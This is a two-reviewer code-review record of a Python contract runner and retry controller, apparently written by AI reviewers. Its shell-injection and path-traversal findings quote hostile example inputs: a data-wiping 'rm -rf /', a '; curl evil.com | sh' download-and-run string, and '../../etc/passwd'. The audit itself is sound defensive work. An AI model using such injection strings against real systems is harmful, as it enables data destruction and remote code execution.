---
type: review
review_type: code
review_mode: diff
scope: manual
project: tess-v2
domain: software
language: python
diff_stats:
  files_changed: 9
  insertions: 3371
  deletions: 0
skill_origin: code-review
created: 2026-04-01
updated: 2026-04-01
reviewers:
  - anthropic/claude-opus-4-6
  - codex/gpt-5.3-codex
config_snapshot:
  curl_timeout: 120
  codex_timeout: 180
  max_tokens: 8192
  retry_max_attempts: 3
safety_gate:
  hard_denylist_triggered: false
  soft_heuristic_triggered: false
  user_override: false
  warnings: []
reviewer_meta:
  anthropic:
    http_status: 200
    latency_ms: 85260
    attempts: 1
    token_usage:
      input_tokens: 39174
      output_tokens: 3834
    raw_json: reviews/raw/2026-04-01-code-review-manual-runner-anthropic.json
  codex:
    exit_code: 0
    latency_ms: 71000
    tools_run:
      - "pwd && ls -la"
      - "rg --files | head -n 200"
      - "rg (pyproject/setup/tox/requirements search)"
      - "rg --files | rg src/tess/ tests/"
      - "find . -maxdepth 4 -type d -name src -o -name tests"
    token_usage:
      input_tokens: unknown
      output_tokens: unknown
    jsonl_log: reviews/raw/2026-04-01-code-review-manual-runner-codex.jsonl
    raw_text: reviews/raw/2026-04-01-code-review-manual-runner-codex.txt
tags:
  - review
  - code-review
status: active
---

# Code Review: Tess v2 Contract Runner and Ralph Loop Controller

**Scope:** Manual code review of Phase 3 runner implementation — contract.py, parser.py, runner.py, ralph.py, sample contract, and full test suite (9 new files, +3,371 lines).

**Reviewers:** Claude Opus 4.6 (API) and Codex GPT-5.3 (CLI).

**Note:** Codex was unable to run pytest or type-checker because the `-C` working directory resolved to the vault root rather than the tess-v2 repo. Codex findings are based on static diff analysis only (CDX-F0).

---

## Reviewer 1: Claude Opus 4.6 (Anthropic)

### ANT-F1 — CRITICAL
**File:** `src/tess/runner.py` lines 168-195, 453-485
**Finding:** Shell command injection via unsanitized contract-authored input. Both `_run_command_exit_zero` and `run_artifact_check` pass user-authored strings directly to `subprocess.run(..., shell=True)`. A malicious or malformed contract YAML could contain `verification: "rm -rf / #"` or `command: "; curl evil.com | sh"`.
**Fix:** Add an allowlist of permitted commands or validate against injection patterns. For `run_artifact_check`, consider parsing the verification command and only allowing specific binaries. For `command_exit_zero`, consider `shell=False` with `shlex.split()`, or document contracts as a trusted input boundary.

### ANT-F2 — SIGNIFICANT
**File:** `src/tess/ralph.py` lines 229-237
**Finding:** On success, `iterations_remaining` is never decremented, causing inconsistency. After fail-then-pass (budget=3), `iterations_remaining == 2` but `iterations_used == 2`, meaning remaining + used = 4, not 3.
**Fix:** Compute as a property: `@property def iterations_remaining(self): return self.retry_budget - self.iterations_used`. The current dual-tracking is error-prone.

### ANT-F3 — SIGNIFICANT
**File:** `src/tess/ralph.py` lines 289-301
**Finding:** Consecutive timeout escalation records `outcome: "dead_letter"` but returns `TerminalOutcome.ESCALATED`. These should be consistent.
**Fix:** Change to `outcome="abandoned"` or `outcome="escalated"` to match the ESCALATED classification.

### ANT-F4 — SIGNIFICANT
**File:** `src/tess/ralph.py` lines 305-316
**Finding:** Budget exhaustion escalation also records `outcome: "dead_letter"` in convergence record. Same issue as ANT-F3.
**Fix:** Change to `outcome="abandoned"` to match enum semantics.

### ANT-F5 — SIGNIFICANT
**File:** `src/tess/contract.py` lines 256-260
**Finding:** `load_contract` path-vs-string detection heuristic is fragile. Logic checks suffix, newlines, and start chars to decide if string is a path.
**Fix:** Accept `str | Path` but require callers to explicitly wrap path strings as `Path(...)`, or add a dedicated `load_contract_string()`.

### ANT-F6 — SIGNIFICANT
**File:** `src/tess/parser.py` lines 131-141
**Finding:** Regex extraction for `contract_id` is overly specific: `[A-Z0-9-]+C\d+` requires the ID to end with `C` followed by digits.
**Fix:** Broaden to `[A-Z0-9][-A-Z0-9]+` or make configurable.

### ANT-F7 — SIGNIFICANT
**File:** `src/tess/ralph.py` lines 98-121
**Finding:** Bad-spec detection fires on ANY overlap between current and prior failed check_ids (set intersection), even partial overlap. Overly aggressive.
**Fix:** Require failed check sets to be equal, not just have non-empty intersection.

### ANT-F8 — MINOR
**File:** `src/tess/contract.py` lines 155-157
**Finding:** `SUPPORTED_MINOR` and `SUPPORTED_PATCH` constants are defined but never used. Minor version compatibility isn't enforced.
**Fix:** Either remove unused constants or add minor version check.

### ANT-F9 — MINOR
**File:** `src/tess/contract.py` lines 176-178
**Finding:** `requires_human_approval` validation has confusing double-negative logic.
**Fix:** Simplify to: `if "requires_human_approval" in data and not isinstance(data["requires_human_approval"], bool):`

### ANT-F10 — MINOR
**File:** `src/tess/runner.py` lines 96-101
**Finding:** No path traversal protection — `../../etc/passwd` or `vault:../../etc/passwd` would resolve outside vault root.
**Fix:** Validate resolved path is within vault root: `resolved.resolve().relative_to(vault_root.resolve())`.

### ANT-F11 — MINOR
**File:** `src/tess/contract.py` lines 196-200
**Finding:** V3 contracts don't enforce `quality_retry_budget > 0`. A V3 contract with zero quality budget would pass validation.
**Fix:** Add: `if v == "V3" and qrb < 1: errors.append(...)`.

### ANT-F12 — MINOR
**File:** `src/tess/contract.py` lines 185-190
**Finding:** `side_effects` and `read_paths` type validation is missing — no check that they're lists of strings.
**Fix:** Add type checks for list fields.

### ANT-F13 — MINOR
**File:** `src/tess/parser.py` lines 56-61
**Finding:** Code fence regex requires at least one newline between fences — empty code fences would not match.
**Fix:** Make inner newline optional.

### ANT-F14 — MINOR
**File:** `tests/test_ralph.py` lines 195-213
**Finding:** `test_timeout_then_normal_failure_resets_counter` may have bad-spec detection interference between iterations.
**Fix:** Add explicit assertions about failure classes at each iteration.

### ANT-F15 — MINOR
**File:** `src/tess/runner.py` line 488
**Finding:** `run_iteration` doesn't surface parse recovery information to the Ralph loop for observability.
**Fix:** Consider adding parse recovery info to failure context.

### ANT-F16 — STRENGTH
Closed-schema validation (Amendment V) is well-implemented — unknown fields rejected, system-managed fields distinguished, cross-field rules enforced with clear error accumulation.

### ANT-F17 — STRENGTH
Graduated recovery chain (YAML -> JSON -> regex) with explicit outcome classification is well-designed for LLM output variability.

### ANT-F18 — STRENGTH
All tests run without short-circuiting, verified by explicit test. Critical for failure context injection.

### ANT-F19 — STRENGTH
Thorough test coverage — contract validation, all error types, cross-field rules, all recovery paths, all 9 test types, budget/bad-spec/timeouts, and end-to-end.

### Missing Test Coverage (Anthropic)
- No test for `vault:` prefix resolution in `command_exit_zero`
- No direct test for `run_artifact_check`
- No test for nested JSON schema validation recursion
- No test for `.yml` extension loading
- No test for `_unwrap_execution_result`
- No test for quality_checks validation

**Anthropic Summary: CRITICAL 1 | SIGNIFICANT 6 | MINOR 7 | STRENGTH 4**

---

## Reviewer 2: Codex GPT-5.3

### Tool Execution

Codex executed 8 commands attempting to locate the project and run tooling:
- `pwd && ls -la` — discovered CWD was vault root, not tess-v2 repo
- `rg --files` — file listing
- Multiple `rg` searches for pyproject.toml, setup.cfg, mypy.ini, pytest.ini
- `find . -maxdepth 4 -type d -name src -o -name tests`

All returned no matching project files, confirming the workspace mismatch. Review proceeded as static analysis only.

### CDX-F0 — SIGNIFICANT (Tooling Precondition)
Could not run `pytest` or type checker — workspace did not contain the reviewed code.

### CDX-F1 — CRITICAL
**File:** `src/tess/runner.py` lines 39-53
**Finding:** `resolve_path()` allows `..` traversal in both staging-relative and `vault:` paths.
**Fix:** Normalize with `.resolve()`, enforce parent boundary (`resolved.is_relative_to()`).

### CDX-F2 — CRITICAL
**File:** `src/tess/runner.py` lines 186-235, 539-583
**Finding:** `command_exit_zero` and artifact verification execute contract-provided shell with `shell=True`. Direct command injection/RCE.
**Fix:** Prefer argv execution (`shell=False`) or gate behind trust tier + allowlist/sandbox.

### CDX-F3 — SIGNIFICANT
**File:** `src/tess/runner.py` lines 688-698
**Finding:** Iteration success computed only from tests/artifacts; parsed envelope `status` is ignored. Executor can return `status: failed` while checks pass, and runner still marks `all_passed=True`.
**Fix:** Add system check enforcing `envelope.status == "completed"`.

### CDX-F4 — SIGNIFICANT
**File:** `src/tess/runner.py` lines 684-698
**Finding:** Parsed envelope `contract_id` not validated against `contract.contract_id`. Cross-contract output mixups undetected.
**Fix:** Add system check for exact contract ID match.

### CDX-F5 — SIGNIFICANT
**File:** `src/tess/ralph.py` lines 320-334, 347-361
**Finding:** ESCALATED outcomes set `convergence_record.outcome="dead_letter"`.
**Fix:** Use `"abandoned"` for escalation paths. (Corroborates ANT-F3/F4.)

### CDX-F6 — SIGNIFICANT
**File:** `src/tess/ralph.py` lines 113-124
**Finding:** Bad-spec detection uses set intersection instead of same-failure matching. Partial overlap triggers premature SEMANTIC classification.
**Fix:** Require exact repeated failure signature. (Corroborates ANT-F7.)

### CDX-F7 — SIGNIFICANT
**File:** `src/tess/runner.py` lines 237-272, 396-436, 473-523
**Finding:** Multiple test runners can raise uncaught exceptions from bad params (invalid regex, non-dict schema, non-int min/max).
**Fix:** Validate params in `contract.py` per test type and wrap runner internals into failed `CheckResult`.

### CDX-F8 — MINOR
**File:** `src/tess/contract.py` lines 160-171
**Finding:** Schema version validation enforces only major version, ignoring supported minor/patch constants.
**Fix:** Enforce exact version or document forward-compat rule. (Corroborates ANT-F8.)

### CDX-F9 — MINOR
**File:** `contracts/sample-v1.yaml` lines 19-22
**Finding:** Sample uses `yaml_parseable` on `vault-health-notes.md` (a markdown file). Full-file YAML parse will usually fail for markdown body.
**Fix:** Replace with `frontmatter_valid` + content tests, or point `yaml_parseable` to a YAML artifact.

### CDX-F10 — STRENGTH
Closed-schema unknown-field rejection + system-managed field denial is well implemented.

### CDX-F11 — STRENGTH
Test suite design is broad and behavior-focused. Good foundation for regression control.

**Codex Summary: CRITICAL 2 | SIGNIFICANT 6 | MINOR 2 | STRENGTH 2**

---

## Cross-Reviewer Convergence

| Theme | Anthropic | Codex | Consensus |
|---|---|---|---|
| Shell injection (shell=True) | ANT-F1 CRITICAL | CDX-F2 CRITICAL | **Converged** |
| Path traversal | ANT-F10 MINOR | CDX-F1 CRITICAL | Codex rates higher |
| Convergence outcome mislabel | ANT-F3/F4 SIGNIFICANT | CDX-F5 SIGNIFICANT | **Converged** |
| Bad-spec overly aggressive | ANT-F7 SIGNIFICANT | CDX-F6 SIGNIFICANT | **Converged** |
| Semver unused constants | ANT-F8 MINOR | CDX-F8 MINOR | **Converged** |
| Closed-schema strength | ANT-F16 STRENGTH | CDX-F10 STRENGTH | **Converged** |

### Unique Findings
- **Anthropic only:** ANT-F2 (iterations_remaining drift), ANT-F5 (load_contract heuristic), ANT-F6 (regex contract_id pattern), ANT-F9/F11/F12/F13/F14/F15
- **Codex only:** CDX-F3 (envelope status ignored), CDX-F4 (contract_id not verified), CDX-F7 (uncaught param exceptions), CDX-F9 (sample contract yaml_parseable on markdown)
